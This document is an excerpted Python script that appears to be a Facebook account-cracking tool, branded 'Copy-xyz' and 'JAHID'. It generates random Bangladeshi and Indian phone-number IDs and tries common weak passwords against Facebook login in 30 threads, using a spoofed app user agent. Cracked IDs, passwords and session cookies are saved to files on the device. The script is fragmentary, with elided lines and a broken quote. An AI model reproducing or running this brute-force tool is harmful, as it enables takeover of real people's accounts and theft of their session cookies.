...
try:
 ...
 print(f'')
loop = 0
try:os.mkdir('/sdcard/Copy-xyz-IDS')
except:pass
def uasp():
   ...
   xnxx = random.choice(['/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"])
...
░█▄▄█ ▀▀▀▀ █▀▀▀ ▄▄▄█ ── ▀▀▀ ▄▄▄█ ▀─▀          	{R}©{G}Copy-xyz
	{W}─────────────────────────────────────	
	{W}[{B}★{W}] Created by 	: Copy-xyz 
	{W}[{B}★{W}] Status 	: Personal
	{W}[{B}★{W}] Tools 	: File  V Random
	{W}─────────────────────────────────────
...
def Cr():
	clr()
	lin()
	print(f'   {W}[{B}1{W}] FILE ')
	print(f'   {W}[{B}2{W}] RANDOM  BD')
	print(f'   {W}[{B}3{W}] RANDOM  INDIA')
...
class JAHID_main():
    ...
    def m1(self,iid,name,passlist):
        try:
            global ok,loop
            sys.stdout.write(f"\r{W} [JAHID-XD] %s|{G}OK:-%s{W}"%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[0]
            try:
                ln = name.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    if "yes" in scoki:
                        ...
                        open('/sdcard/Copy-xyz-IDS/UID-OK.txt','a').write(iid+'|'+pas+'|'+coki+'\n')
                        ok.append(iid)
                        break
                    else:
                    ...
                    open('/sdcard/Copy-xyz-IDS/file-cp.txt','a').write(iid+'|'+pas+'\n')
                    cp.append(iid)
                else:
                    continue
            loop+=1
       ...
       ua = '[FBAN/FB4A;FBAV/373.0.0.2.104;FBBV/234544003;FBDM/{density=2.3,width=1080,height=1483};FBLC/es_ES;FBRV/815059637;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
                ...
                if 'session_key' in po:
                    if "yes" in scoki:
                        ...
                        print(f'\r{G} [OK] '+iid+' | '+pas+'\033[0;97m')
                        open('/sdcard/Copy-xyz-IDS/UID-OK.txt','a').write(iid+'|'+pas+'\n')
                        ok.append(iid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    open('/sdcard/Copy-xyz-IDS/UID-CP.txt','a').write(iid+'|'+pas+'\n')
                    cp.append(iid)
                else:
                    continue
            loop+=1
...
def rndom():
		...
		try:
			...
			limit = int(input(f' {W}[{B}★{W}] JAHIDing Limite :{G} '))
		except ValueError:
			limit = 5000
		...
		with ThreadPool(max_workers=30) as SPYC:	
			...
			for psx in user:
				ids = '+88'+code+psx
				passlist = [ids[3:11],ids[3:11],ids[3:10],ids[6:14],ids[8:14],'bangla','bangladesh','Bangladesh','i love you','@@@###','@#@#@#','###@@@','free fire','fuck you','708090','১২৩৪৫৬','first last','First Last']
...
def rndomm():
		...
		try:
			print(f' {W}[{B}★{W}] Example :{G} 1000, 5000, 10000, 99999')
			limit = int(input(f' {W}[{B}★{W}] JAHID Limite :{G} '))
		except ValueError:
			limit = 5000
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
...
def rnapi(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [JAHID-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/Copy-xyz-IDS/UID-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/Copy-xyz-IDS/UID-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
